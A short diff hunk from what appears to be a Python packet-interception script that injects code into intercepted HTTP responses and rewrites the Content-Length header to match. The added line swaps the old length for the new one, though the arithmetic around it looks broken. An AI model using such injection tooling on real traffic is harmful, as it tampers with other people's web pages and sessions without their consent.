@@ -53,6 +53,7 @@ def process_packet(packet):
                 content_length = content_length_search.group(1) #second element of regex is the number
                 #print(content_length)
                 new_content_length = int(content_length + len(injection_code))
+                load = load.replace(content_length, new_content_length)
                 print(new_content_length)
                 
             #this wont work on pages that specify Content-Length headers;
